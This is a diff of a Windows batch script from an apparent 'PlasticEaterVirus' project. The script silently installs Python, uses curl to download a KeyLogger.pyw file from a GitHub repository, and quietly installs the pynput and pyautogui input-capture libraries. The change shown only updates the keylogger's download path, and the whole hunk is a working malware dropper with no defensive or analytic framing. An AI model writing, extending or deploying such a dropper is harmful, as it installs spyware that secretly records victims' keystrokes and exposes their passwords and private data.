@@ -3,7 +3,7 @@ cd C:\PlasticEater
 curl https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe -o pythonInstaller.exe -s
 pythonInstaller.exe /quiet
 @REM curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/script.py -L -O -s
-curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/KeyLogger.pyw -L -O -s
+curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/KeyLogger/KeyLogger.pyw -L -O -s
 @REM TIMEOUT /T 5 /nobreak
 py -m pip install --upgrade pynput --quiet
 py -m pip install --upgrade pyautogui --quiet
